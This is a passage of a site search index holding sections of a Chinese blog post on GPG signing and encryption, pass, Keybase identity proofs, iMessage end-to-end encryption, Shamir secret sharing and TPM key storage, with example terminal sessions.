a/ooD6gc71t457pVgkMqjo3Auazf4PRilUsAraQZilr+8yPhciE/PX3gBL5CtKHJ 4vKH9P9RngigL6D+YyBB5vMcpXlhx9ShbH2qLr106adJ1XrCpGtSmfxygjRn3xX9 Q1dWUaELUahhcdtK6IwZ6qzyp9AESpSd+Z/bnV7jc8iC0VtMOXipVnMo7J5qyHKD /+yt8/tzoC4+0MEzlaHJ =aOto -----END PGP SIGNATURE----- \u4e0a\u9762\u6211\u4eec\u5148\u7528 SHA1 \u5bf9\u8981\u7b7e\u540d\u7684\u6587\u672c\u8fdb\u884c\u8fdb\u884c\u4e86\u4e00\u4e0b\u6458\u8981\uff0c\u7136\u540e\u7528 GPG \u5bf9\u8fd9\u4e2a\u6458\u8981\u8fdb\u884c\u4e86\u7b7e\u540d\u3002 \u56e0\u4e3a Git \u4e2d\u7684\u7528\u6237\u540d\u548c\u90ae\u4ef6\u5730\u5740\u5176\u5b9e\u662f\u53ef\u4ee5\u968f\u610f\u66f4\u6539\u7684\uff0c\u4e4b\u524d\u6709\u8fc7\u51e0\u6b21\u4f2a\u9020 Commit \u5192\u5145\u5927 V \u7684\u4e8b\u4ef6\u53d1\u751f\u3002\u6700\u8fd1 GitHub \u652f\u6301\u4e86\u4e3a\u5e10\u53f7\u914d\u7f6e GPG \u516c\u94a5\uff0c\u7136\u540e\u4f60\u4fbf\u53ef\u4ee5\u5728\u53d1\u5e03\u65b0\u7248\u672c\u7684\u65f6\u5019\u7528 git tag -s v1.0.0 \u8fdb\u884c\u7b7e\u540d\uff1a \u4f60\u53ef\u4ee5\u5728\u672c\u5730\u8fd9\u6837\u6765\u9a8c\u8bc1\u7b7e\u540d\uff0c\u4e00\u65e6\u7b7e\u540d\u8ba4\u8bc1\u901a\u8fc7\uff0c\u548c\u6b63\u786e\u7684 GPG \u5e10\u53f7\u7ba1\u7406\uff0c\u90a3\u4e48\u8fd9\u4e2a Commit \u5c31\u4e0d\u53ef\u80fd\u662f\u4f2a\u9020\u7684\uff1a ~> git tag -v v1.1.0 object b0e42636df7394ac34f2b61c589233d0c3296d10 type commit tag v1.1.0 tagger jysperm <jysperm@gmail.com> 1467084786 +0800 gpg: Signature made 6/28 11:33:17 2016 CST gpg: using RSA key B40F3AF0E466CF1E gpg: Good signature from \"Wang Ziting <jysperm@gmail.com>\" \u5f88\u591a\u5f00\u6e90\u8f6f\u4ef6\u5728\u53d1\u5e03\u65b0\u7248\u672c\u7684\u4e8c\u8fdb\u5236\u5305\u65f6\u4e5f\u4f1a\u4f7f\u7528 GPG \u8fdb\u884c\u7b7e\u540d\uff0c\u5305\u62ec Debian \u7684\u8f6f\u4ef6\u4ed3\u5e93 apt \u4e5f\u662f\u901a\u8fc7 GPG \u8fdb\u884c\u7b7e\u540d\u7684\u3002 \u7136\u540e\u4f60\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528 GPG \u52a0\u5bc6\u6d88\u606f\uff1a ~> echo 'hello' | gpg --encrypt -a -r jysperm -----BEGIN PGP MESSAGE----- hQEMAyp325QokoazAQf8DDqELYisLFSGo/9Gblr1MEabb9t3V3AcbWkA4uimpYeD /DTWDlmxrIsvpmDDeV/1bAZ/gMc2DzhODfM4PQf8DfD+lvHwgMBhe1zSBCZlQwkj xkP+CtF+S8xWTciaexIMQiTHLNu1tvhvCjIeR1qYJY0/E7tdKhS5iG4Jc3/oyCNN a1m34O9GG5WJsHozGqpfKZFma50onDmQ6TnSuz4iDWrslvq3XuLRXvgOQ6DKArix Sxnmxg1kMvlIF6AMmQRHaHpyXBoOlaX/NEsl8ESCe9w4KZFTCoFtsEB9tAwQGeGn 6Tnd7BLaxXOabqaSpoNcOlpWDlZcX89lbewAryKbY9I7AbURsuemI37bTizQUjWA 57xm4t7wTUJ/FLx22Amv1ljUa/Rq84rO8d38EQViNGyo31UmRVXy12AmBDU= =T42S -----END PGP MESSAGE----- \u8fd9\u91cc\u6211\u4eec\u6307\u5b9a\u4e86\u6211\u81ea\u5df1\u7684\u516c\u94a5\u4e3a\u6536\u4fe1\u4eba\uff0c\u53ef\u4ee5\u770b\u5230\u4e0d\u540c\u4e8e\u524d\u9762\uff0c\u52a0\u5bc6\u6d88\u606f\u6ca1\u6709\u660e\u6587\u90e8\u5206\uff0c\u9664\u975e\u4f7f\u7528\u6536\u4fe1\u4eba\u7684\u79c1\u94a5\uff0c\u5426\u5219\u65e0\u6cd5\u89e3\u5bc6\uff1a $ gpg -d < gpg-message gpg 2048-bit RSA key, ID 289286B3, created 2016-06-28 (main key ID E466CF1E) Wang Ziting <jysperm@gmail.com> hello SSH \u56e0\u4e3a SSH \u548c GPG \u90fd\u652f\u6301\u4e00\u6837\u7684\u516c\u94a5\u52a0\u5bc6\u7b97\u6cd5\uff08\u4f8b\u5982 RSA\uff09\uff0c\u56e0\u6b64\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728 SSH \u4e0a\u4f7f\u7528 GPG \u7684\u5bc6\u94a5\u3002 \u4f8b\u5982\u5c06\u4f60\u7684 GPG \u516c\u94a5\u6dfb\u52a0\u5230 GitHub\uff0c\u7136\u540e\u4f7f\u7528\u5b83\u6765\u767b\u5f55 GitHub: ~> export SSH_AUTH_SOCK=~/.gnupg/S.gpg-agent.ssh ~> ssh-add -l 2048 SHA256:wO93TcTQHZtltKfvS0jewFh0CMj4No6xnTegtB8FN+k ~> ssh git@github.com Hi jysperm! You've successfully authenticated, but GitHub does not provide shell access. Connection to github.com closed. \u7ba1\u7406\u5bc6\u7801 \u6709\u4e00\u4e2a\u6bd4\u8f83\u6709\u8da3\u7684\u5b9e\u8df5\u662f\u4f60\u53ef\u4ee5\u7528 gpg \u6765\u52a0\u5bc6\u4f60\u7684\u5bc6\u7801\uff0c pass-store \u662f\u4e00\u4e2a\u57fa\u4e8e GPG \u548c Git \u7684\u975e\u5e38\u7b80\u5355\u7684\u5bc6\u7801\u7ba1\u7406\u5668\uff0c\u5b83\u53ef\u4ee5\u7528 GPG \u6765\u52a0\u5bc6\u5bc6\u7801\uff0c\u7136\u540e\u7528 Git \u6765\u8fdb\u884c\u7248\u672c\u63a7\u5236\uff1a ~> pass find Coding Search Terms: Coding \u2514\u2500\u2500 Code \u2514\u2500\u2500 Coding \u2514\u2500\u2500 jysperm.gpg ~> pass insert Code/Coding/jysperm ~> pass show Code/Coding/jysperm DzizKKVIy22aHQwm ~> pass git pull --rebase remote: Counting objects: 11, done. remote: Total 11 (delta 1), reused 1 (delta 1), pack-reused 10 Unpacking objects: 100% (11/11), done. From github.com:jysperm/passwords 5026f34..e94a70f master -> origin/master First, rewinding head to replay your work on top of it... Fast-forwarded master to e94a70f8b42af5e1c13dd69246b156bbcb24a94c. \u8fd9\u6837\u4e00\u6765\u4f60\u751a\u81f3\u53ef\u4ee5\u628a\u5bc6\u7801\u6258\u7ba1\u5728 GitHub \u4e0a\uff1a https://github.com/jysperm/passwords","title":"\u4f7f\u7528 GPG"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#keybase","text":"\u518d\u5411\u5927\u5bb6\u4ecb\u7ecd\u4e00\u4e2a\u6709\u8da3\u7684\u793e\u533a \u2014\u2014 Keybase \uff0c\u5b83\u5c31\u597d\u50cf\u662f GitHub \u4e4b\u4e8e GPG \u793e\u533a\u4e00\u6837\u3002\u63d0\u4f9b\u4e86\u4e00\u4e2a\u4f60\u7684 GPG \u8eab\u4efd\u7684\u4e3b\u9875\uff0c\u4e0a\u9762\u6709\u4f60\u7684\u516c\u94a5\u3001\u5173\u8054\u7684 GitHub \u5e10\u53f7\u3001Twitter \u5e10\u53f7\u4ee5\u53ca\u6240\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ed6\u4eba\u8fd8\u53ef\u4ee5\u5728\u8fd9\u4e2a\u7f51\u9875\u4e0a\u76f4\u63a5\u7528\u4f60\u7684\u516c\u94a5\u53d1\u9001\u7ecf\u8fc7 GPG \u52a0\u5bc6\u7684\u4fe1\u606f\u3002\u4f60\u53ef\u4ee5\u5c06\u4f60\u7684\u79c1\u94a5\u4ee5\u52a0\u5bc6\u7684\u65b9\u5f0f\u5b58\u50a8\u5728 Keybase\uff08\u5f53\u7136\u4e0d\u63a8\u8350\u8fd9\u6837\u505a\uff09\uff0cKeybase \u63d0\u4f9b\u4e86\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528\u5bc6\u94a5\u5bf9\u8fdb\u884c\u52a0\u5bc6\u3001\u89e3\u5bc6\u3001\u7b7e\u540d\u3001\u9a8c\u7b7e\u7684\u529f\u80fd\u3002 \u524d\u9762\u6211\u4eec\u63d0\u5230\u5728 Keybase \u4e0a\u4f60\u53ef\u4ee5\u5173\u8054\u4f60\u7684\u793e\u4ea4\u5e10\u53f7\uff0c\u4e0d\u540c\u4e8e\u4e00\u822c\u7684\u7f51\u7ad9\u7684\u300c\u7b2c\u4e09\u65b9\u5e10\u53f7\u5173\u8054\u300d\uff0cKeybase \u7684\u7528\u6237\u4eec\u663e\u7136\u90fd\u5bf9\u53bb\u4e2d\u5fc3\u5316\u975e\u5e38\u5728\u4e4e\uff0c\u90a3\u4e48\u5982\u4f55\u53bb\u8bc1\u660e\u4e00\u4e2a\u793e\u4ea4\u5e10\u53f7\u662f\u5c5e\u4e8e\u8fd9\u4e2a GPG \u516c\u94a5\u7684\u5462\uff1f\u5728\u8fd9\u4e2a\u573a\u666f\u4e2d\u6211\u4eec\u9700\u8981\u8fdb\u884c\u4e24\u65b9\u9762\u7684\u8bc1\u660e\uff0c\u4e00\u65b9\u9762\u662f\u8981\u7528 GPG \u516c\u94a5\u53bb\u8fdb\u884c\u4e00\u4e2a\u7b7e\u540d\uff0c\u58f0\u660e\u4ed6\u62e5\u6709\u8fd9\u4e2a\u793e\u4ea4\u5e10\u53f7\uff1a \u53e6\u4e00\u65b9\u9762\u662f\u7528\u8fd9\u4e2a\u793e\u4ea4\u5e10\u53f7\u5c06\u8fd9\u4e2a\u7b7e\u540d\u53d1\u5e03\u51fa\u6765\uff0c\u6765\u58f0\u660e\u4ed6\u62e5\u6709\u8fd9\u4e2a GPG \u516c\u94a5\uff1a \u8fd9\u79cd\u4ea4\u53c9\u7684\u8bc1\u660e\u5c06\u4e0d\u540c\u7684\u6570\u5b57\u8eab\u4efd\u8054\u7cfb\u5230\u4e86\u4e00\u8d77\uff0c\u6211\u89c9\u5f97\u8fd9\u662f\u4e00\u4e2a\u633a\u6709\u8da3\u7684\u4e8b\u60c5\uff0c\u4e8e\u662f\u6211\u5728 KeyBase \u4e4b\u5916\u4e5f\u81ea\u5df1\u521b\u5efa\u4e86\u4e00\u4e2a GPG \u4e3b\u9875\uff0c\u5e76\u5728\u4e0a\u9762\u5217\u51fa\u4e86\u4e00\u4e9b\u548c\u5176\u4ed6\u6570\u5b57\u8eab\u4efd\u7684\u4ea4\u53c9\u8bc1\u660e\uff0c\u4f8b\u5982\u90ae\u4ef6\u3001V2EX \u5e10\u53f7\u7b49\u3002\u6211\u8fd8\u6ce8\u518c\u4e86\u4e00\u4e2a\u6211\u7684 GPG \u516c\u94a5\u540e\u516b\u4f4d\u7684\u57df\u540d\u6765\u6307\u5411\u8fd9\u4e2a\u9875\u9762\uff1a http://E466CF1E.pub","title":"KeyBase \u548c\u8eab\u4efd\u8bc1\u660e"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#_3","text":"\u6211\u4eec\u518d\u6765\u8f6c\u5411\u8fd9\u7bc7\u6587\u7ae0\u7684\u7b2c\u4e8c\u4e2a\u8bdd\u9898\u300c\u7aef\u5230\u7aef\u52a0\u5bc6\u300d\uff0c\u4e0b\u56fe\u4e2d\u5206\u522b\u5c55\u793a\u4e86\u5728\u65e0\u52a0\u5bc6\u3001SSL \u52a0\u5bc6\u548c\u7aef\u5230\u7aef\u52a0\u5bc6\u7684\u573a\u666f\u4e0b\uff0c\u4ece A \u5230 B\u3001\u4e2d\u95f4\u7ecf\u8fc7\u670d\u52a1\u5668\u7684\u4e00\u6b21\u901a\u8baf\u7684\u8fc7\u7a0b\uff1a \u5728\u6ca1\u6709\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u4ece A \u5230\u670d\u52a1\u5668\u3001\u518d\u5230 B \u7684\u5168\u7a0b\u90fd\u6ca1\u6709\u52a0\u5bc6\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u6570\u636e\u7ecf\u8fc7\u7684\u94fe\u8def\u4e0a\u7684\u4efb\u4f55\u4e00\u4e2a\u8282\u70b9\uff08\u4f8b\u5982\u8fd0\u8425\u5546\u7684\u8def\u7531\u5668\uff09\u90fd\u53ef\u4ee5\u67e5\u770b\u548c\u4fee\u6539\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u901a\u8baf\u5b89\u5168\u662f\u5b8c\u5168\u6ca1\u6709\u4fdd\u8bc1\u7684\u3002 \u5728\u7ecf\u8fc7 SSL \u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0cA \u548c B \u4f1a\u5206\u522b\u5728\u6536\u53d1\u6d88\u606f\u524d\u901a\u8fc7 CA \u7b7e\u7f72\u7684\u8bc1\u4e66\u53bb\u8ba4\u8bc1\u670d\u52a1\u5668\u7684\u8eab\u4efd\uff0c\u5e76\u534f\u5546\u4e00\u4e2a\u7528\u4e8e\u52a0\u5bc6\u6570\u636e\u7684\u5bc6\u94a5\u3002\u5728\u4ece A \u5230\u670d\u52a1\u5668\uff0c\u6216\u4ece\u670d\u52a1\u5668\u5230 B \u7684\u8fc7\u7a0b\u4e2d\uff0cSSL \u4f1a\u4fdd\u8bc1\u6570\u636e\u4e0d\u88ab\u7a83\u542c\u548c\u7be1\u6539\uff0c\u4f46\u6d88\u606f\u5728\u670d\u52a1\u5668\u4e0a\u5219\u662f\u4ee5\u672a\u52a0\u5bc6\u7684\u5f62\u6001\u5b58\u5728\u7684\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u67e5\u770b\u548c\u4fee\u6539\u6d88\u606f\u7684\u5185\u5bb9\uff0c\u8fdb\u884c\u4e00\u4e9b\u5185\u5bb9\u4e0a\u7684\u5ba1\u67e5\u3002 \u5728\u7aef\u5230\u7aef\u52a0\u5bc6\u7684\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u5728\u4ece A \u53d1\u51fa\u4e4b\u524d\uff0c\u5c31\u4f1a\u5229\u7528\u6211\u4eec\u524d\u9762\u4ecb\u7ecd\u8fc7\u7684\u516c\u94a5\u52a0\u5bc6\u6280\u672f\uff0c\u4f7f\u7528 B \u7684\u516c\u94a5\u8fdb\u884c\u52a0\u5bc6\uff0c\u4e2d\u95f4\u4ee5\u52a0\u5bc6\u7684\u5f62\u5f0f\u7ecf\u8fc7\u670d\u52a1\u5668\u548c\u5176\u4ed6\u8def\u7531\u8282\u70b9\uff0c\u76f4\u5230 B \u6536\u5230\u6d88\u606f\u540e\uff0c\u624d\u4f7f\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u8fdb\u884c\u89e3\u5bc6\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7684\u670d\u52a1\u5668\u5e76\u4e0d\u80fd\u67e5\u770b\u548c\u4fee\u6539\u6d88\u606f\uff0c\u4ec5\u4ec5\u4f5c\u4e3a\u4e00\u4e2a\u6e20\u9053\u6765\u8f6c\u53d1\u6d88\u606f\u3002 \u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u7b80\u5355\u5730\u4f7f\u7528 GPG \u52a0\u5bc6\u6211\u4eec\u5728\u7b2c\u4e09\u65b9\u5373\u65f6\u901a\u8baf\u8f6f\u4ef6\u4e0a\u7684\u804a\u5929\u5185\u5bb9\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a \u4f46\u5b9e\u9645\u4e0a\u4f8b\u5982 Tox\u3001Line\u3001WhatsApp\u3001iMessage \u7b49 IM \u8f6f\u4ef6\uff0c\u90fd\u662f\u9ed8\u8ba4\u63d0\u4f9b\u4e86\u7aef\u5230\u7aef\u52a0\u5bc6\u7684\u7279\u6027\u7684\uff0c\u6211\u4eec\u4e0b\u9762\u4ee5 iMessage \u4e3a\u4f8b\u53bb\u4ecb\u7ecd\u4e00\u4e2a IM \u8f6f\u4ef6\u662f\u5982\u4f55\u5b8c\u6210\u7aef\u5230\u7aef\u52a0\u5bc6\u901a\u8baf\u7684\u3002 iMessage \u4f1a\u5728\u6bcf\u53f0\u8bbe\u5907\u4e0a\u751f\u6210\u4e00\u4e2a RSA \u5bc6\u94a5\u5bf9\u7528\u4e8e\u5bf9\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ee5\u53ca\u4e00\u4e2a ECDSA \u5bc6\u94a5\u5bf9\u7528\u4f5c\u7b7e\u540d\uff08\u5b83\u51fa\u4e8e\u5b89\u5168\u6027\u548c\u6027\u80fd\u7684\u8003\u8651\u4f7f\u7528\u4e86\u4e0d\u540c\u7684\u5bc6\u94a5\u5bf9\uff0c\u4f46\u5176\u5b9e\u662f\u53ef\u4ee5\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\u5bf9\u7684\uff09\u3002\u8fd9\u4e9b\u5bc6\u94a5\u5bf9\u4e2d\u7684\u516c\u94a5\u4f1a\u88ab\u4e0a\u4f20\u5230 Apple IDS\uff08Identity Services\uff09\uff0c\u7136\u540e\u5176\u4ed6\u7528\u6237\u4f1a\u4ece IDS \u4e2d\u53d6\u5f97\u4f60\u7684\u6240\u6709\u516c\u94a5\uff08\u6bcf\u4e2a\u8bbe\u5907\u4e00\u4e2a\u516c\u94a5\uff09\u3002\u5728 iMessage \u4e2d\u53d1\u51fa\u7684\u6240\u6709\u6587\u5b57\u6d88\u606f\u90fd\u4f1a\u4f7f\u7528\u81ea\u5df1\u7684 ECDSA \u79c1\u94a5\u8fdb\u884c\u7b7e\u540d\uff0c\u4f7f\u7528\u5bf9\u65b9\u7684\u6bcf\u4e2a\u8bbe\u5907\u7684 RSA \u516c\u94a5\u52a0\u5bc6\u4e00\u4efd\uff0c\u901a\u8fc7 APNs \u53d1\u9001\u7ed9\u5bf9\u65b9\u3002\u5bf9\u4e8e\u591a\u5a92\u4f53\u6d88\u606f\uff0c\u4e3a\u4e86\u51cf\u5c11\u52a0\u5bc6\u5e26\u6765\u7684\u5f00\u9500\uff0c\u4ee5\u53ca\u52a0\u5bc6\u591a\u4efd\u7684\u6d41\u91cf\u5f00\u9500\uff0c\u4f1a\u4f7f\u7528\u4e00\u4e2a\u4e34\u65f6\u5bc6\u94a5\u52a0\u5bc6\u4e00\u6b21\uff0c\u901a\u8fc7 iCloud \u8fdb\u884c\u4f20\u8f93\uff0c\u7136\u540e\u901a\u8fc7\u524d\u9762\u63d0\u5230\u7684\u65b9\u5f0f\u53d1\u9001\u4e34\u65f6\u5bc6\u94a5\u3002\u82f9\u679c\u7684\u5f88\u591a\u5e94\u7528\u90fd\u4f7f\u7528\u7c7b\u4f3c\u7684\u65b9\u5f0f\u8fdb\u884c\u7aef\u5230\u7aef\u52a0\u5bc6\uff0c\u5305\u62ec iCloud\u3001Facetime\u3001Keychain \u7b49\u3002 \u4f46\u5728\u8fd9\u4e2a\u67b6\u6784\u4e2d\uff0cApple IDS \u4f9d\u7136\u662f\u4e00\u4e2a\u4e2d\u5fc3\u5316\u7684\u5355\u70b9\uff0c\u5b83\u63a7\u5236\u4e86\u5168\u90e8\u7684\u516c\u94a5\u4ea4\u6362\u8fc7\u7a0b\uff0c\u800c\u4e14\u4e0d\u5141\u8bb8\u7528\u6237\u5e72\u9884\u3002\u8fd9\u5c31\u610f\u5473\u7740 Apple \u4f9d\u7136\u53ef\u4ee5\u5728 IDS \u4e0a\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u8fd9\u4e5f\u5370\u8bc1\u4e86\u6211\u4eec\u5728\u4e00\u5f00\u59cb\u63d0\u5230\u7684\uff0c\u516c\u94a5\u7684\u4ea4\u6362\u662f\u4e00\u4e2a\u65e0\u6cd5\u7ed5\u5f00\u7684\u95ee\u9898\u3002\u5728 GPG \u4e2d\uff0c\u7528\u6237\u9700\u8981\u7e41\u7410\u5730\u5b8c\u5168\u624b\u52a8\u5730\u53bb\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\uff0c\u6362\u53d6\u4e86\u6700\u9ad8\u7684\u53bb\u4e2d\u5fc3\u5316\u7a0b\u5ea6\uff1b\u800c\u5728 iMessage \u4e2d IDS \u4ee3\u52b3\u4e86\u516c\u94a5\u4ea4\u6362\u7684\u5de5\u4f5c\uff0c\u65b9\u4fbf\u4e86\u7528\u6237\uff0c\u4f46\u4e5f\u5f15\u5165\u4e86\u5b89\u5168\u98ce\u9669\u3002 \u540c\u65f6\u7fa4\u804a\u4e5f\u662f\u4e00\u4e2a\u6bd4\u8f83\u96be\u4ee5\u89e3\u51b3\u7684\u95ee\u9898\uff0c\u5728 Telegram \u4e2d\u7fa4\u804a\u662f\u65e0\u6cd5\u5f00\u542f\u7aef\u5230\u7aef\u52a0\u5bc6\u6a21\u5f0f\u7684\uff0c\u5728 iMessage \u4e2d\u7fa4\u804a\u4e5f\u4e0d\u603b\u662f\u53ef\u4ee5\u4f7f\u7528\u7aef\u5230\u7aef\u52a0\u5bc6\u3002\u8fd9\u662f\u56e0\u4e3a\u5c31\u50cf\u524d\u9762\u63d0\u5230\u7684\u591a\u8bbe\u5907\u7684\u60c5\u51b5\u4e00\u6837\uff0c\u5728\u7fa4\u804a\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u5fc5\u987b\u7528\u6bcf\u4e2a\u4eba\u7684\u516c\u94a5\u6765\u52a0\u5bc6\u6570\u636e\uff0c\u8fd9\u6837\u6570\u636e\u5728\u53d1\u9001\u7aef\u5c31\u4f1a\u81a8\u80c0\u8bb8\u591a\u500d\uff08\u800c\u4e0d\u80fd\u53d1\u9001\u7aef\u53ea\u53d1\u9001\u4e00\u4efd\uff0c\u7531\u670d\u52a1\u5668\u8f6c\u53d1\uff09\uff0c\u5177\u4f53\u7684\u5e26\u5bbd\u5f00\u9500\u4f1a\u53d6\u51b3\u4e8e\u7fa4\u804a\u4e2d\u7684\u4eba\u6570\uff1a","title":"\u7aef\u5230\u7aef\u52a0\u5bc6"},{"location":"other/%E7%8E%8B%E5%AD%90%E4%BA%AD%E7%9A%84%E5%8D%9A%E5%AE%A2%20GPG%20%E4%B8%8E%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%8A%A0%E5%AF%86%EF%BC%9A%E8%AE%BA%E4%BB%80%E4%B9%88%E6%89%8D%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BF%A1%E4%BB%BB%E7%9A%84/#_4","text":"\u524d\u9762\u6211\u4eec\u63d0\u5230\uff0c\u5728\u5bc6\u7801\u5b66\u8d26\u6237\u4e2d\uff0c\u4f60\u62e5\u6709\u4e00\u4e2a\u8d26\u6237\u7684\u552f\u4e00\u51ed\u8bc1\u5c31\u662f\u4f60\u7684\u5bc6\u94a5\u5bf9\uff0c\u4e00\u65e6\u9057\u5931\uff0c\u90a3\u4e48\u4f60\u4fbf\u6ca1\u6709\u529e\u6cd5\u518d\u53bb\u63a7\u5236\u8fd9\u4e2a\u8d26\u6237\uff1b\u6216\u8005\u4e00\u65e6\u6cc4\u6f0f\uff0c\u5176\u4ed6\u4eba\u4fbf\u62e5\u6709\u548c\u4f60\u4e00\u6837\u7684\u63a7\u5236\u8fd9\u4e2a\u8d26\u6237\u7684\u80fd\u529b\uff0c\u65e0\u6cd5\u91cd\u7f6e\uff0c\u56e0\u6b64\u5bf9\u5bc6\u94a5\u7684\u4fdd\u7ba1\u663e\u5f97\u5c24\u4e3a\u91cd\u8981\u3002 \u300c\u5907\u4efd\u300d\u662f\u5177\u6709\u4e24\u9762\u6027\u7684 \u2014\u2014 \u4e00\u65b9\u9762\u4f1a\u8ba9\u5bc6\u94a5\u66f4\u4e0d\u5bb9\u6613\u4e22\u5931\uff0c\u4f46\u4e5f\u8ba9\u5bc6\u94a5\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u6cc4\u6f0f\u3002\u4e8e\u662f\u6211\u5c31\u6709\u4e2a\u6709\u8da3\u7684\u60f3\u6cd5\uff1a\u80fd\u5426\u505a\u5230\u5c06\u4e00\u4e2a\u5bc6\u94a5\u5206\u4e3a\u82e5\u5e72\u300c\u7247\u6bb5\u300d\u4fdd\u5b58\uff0c\u4ec5\u5f53\u62e5\u6709\u5176\u4e2d\u5927\u90e8\u5206\u7247\u6bb5\u7684\u7684\u65f6\u5019\u624d\u80fd\u591f\u8fd8\u539f\u51fa\u5bc6\u94a5\uff0c\u4f46\u4e22\u5931\u4e86\u5c0f\u90e8\u5206\u7247\u6bb5\u53c8\u4e0d\u5f71\u54cd\u8fd8\u539f\u5462\uff1f\u6bd4\u5982\u5c06\u5bc6\u94a5\u5206\u4e3a 5 \u4efd\uff0c\u4ec5\u5f53\u62e5\u6709\u5176\u4e2d\u4efb\u610f\u4e09\u4efd\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u8fd8\u539f\u51fa\u5bc6\u94a5\u3002\u4e8e\u662f\u6211\u627e\u5230\u4e86\u4e00\u4e2a\u53eb\u300cShamir\u2019s Secret Sharing\u300d\u7684\u7b97\u6cd5\u6765\u505a\u5230\u8fd9\u4e00\u70b9\uff1a ~> ssss-split -t 3 -n 5 Generating shares using a (3,5) scheme with dynamic security level. Enter the secret, at most 128 ASCII characters: my secret root password Using a 184 bit security level. 1-1c41ef496eccfbeba439714085df8437236298da8dd824 2-fbc74a03a50e14ab406c225afb5f45c40ae11976d2b665 3-fa1c3a9c6df8af0779c36de6c33f6e36e989d0e0b91309 4-468de7d6eb36674c9cf008c8e8fc8c566537ad6301eb9e 5-4756974923c0dce0a55f4774d09ca7a4865f64f56a4ee0 ~> ssss-combine -t 3 Enter 3 shares separated by newlines: Share [1/3]: 3-fa1c3a9c6df8af0779c36de6c33f6e36e989d0e0b91309 Share [2/3]: 5-4756974923c0dce0a55f4774d09ca7a4865f64f56a4ee0 Share [3/3]: 2-fbc74a03a50e14ab406c225afb5f45c40ae11976d2b665 Resulting secret: my secret root password \u4f46\u5c06\u5bc6\u94a5\u4f5c\u4e3a\u4e00\u4e2a\u6587\u4ef6\uff0c\u5c24\u5176\u662f\u672a\u52a0\u5bc6\u7684\u6587\u4ef6\u5b58\u50a8\u5728\u7535\u8111\u4e0a\u4ecd\u7136\u8fd8\u662f\u76f8\u5f53\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a\u4f60\u7684\u7535\u8111\u4e0a\u5b89\u88c5\u4e86\u592a\u591a\u4e71\u4e03\u516b\u7cdf\u7684\u8f6f\u4ef6\u4e86\uff0c\u76ee\u524d\u5927\u591a\u6570\u684c\u9762\u64cd\u4f5c\u7cfb\u7edf\u5176\u5b9e\u90fd\u6ca1\u6709\u5f88\u597d\u7684\u6743\u9650\u63a7\u5236 \u2014\u2014 \u51e0\u4e4e\u6240\u6709\u8f6f\u4ef6\u90fd\u53ef\u4ee5\u968f\u610f\u5730\u8bfb\u53d6\u4f60\u6240\u6709\u7684\u6587\u4ef6\u3002\u56e0\u6b64 \u5b58\u50a8\u5728\u786c\u76d8\u4e0a\u7684\u6587\u4ef6\u662f\u65e9\u665a\u8981\u6cc4\u6f0f\u7684 \uff0c\u6211\u4eec\u5e94\u8be5\u628a\u5bc6\u94a5\u5b58\u50a8\u5230\u4e00\u4e2a\u65e0\u6cd5\u88ab\u8bfb\u53d6\u7684\u5730\u65b9\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u4e0b\u9762\u8981\u4ecb\u7ecd\u7684 TPM \u82af\u7247\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u82af\u7247\u6765\u8bb2\uff0c\u5916\u754c\u5fc5\u987b\u901a\u8fc7\u5df2\u7ecf\u88ab\u786c\u4ef6\u5b9a\u4e49\u597d\u7684\u534f\u8bae\u53bb\u64cd\u4f5c\u5b83\uff0c\u800c\u5bf9\u4e8e TPM \u6765\u8bb2\uff0c\u5b83\u5728\u786c\u4ef6\u7684\u8bbe\u8ba1\u4e0a\u5c31\u4e0d\u5141\u8bb8\u4f60\u4ece\u82af\u7247\u4e2d\u53d6\u51fa\u79c1\u94a5\uff0c\u4f60\u53ea\u80fd\u5c06\u79c1\u94a5\u5b58\u8fdb\u53bb\uff0c\u6216\u8005\u5728 TPM \u4e0a\u751f\u6210\u5bc6\u94a5\u5bf9\u3002\u4e4b\u540e\u548c\u79c1\u94a5\u6709\u5173\u7684\u6240\u6709\u8fd0\u7b97\uff0c\u5305\u62ec\u89e3\u5bc6\u548c\u7b7e\u540d\u90fd\u662f\u5728 TPM \u82af\u7247\u4e0a\u8fdb\u884c\u7684\uff0c\u6574\u4e2a\u8fc7\u7a0b\u4e2d\u5bc6\u94a5\u90fd\u4e0d\u4f1a\u79bb\u5f00 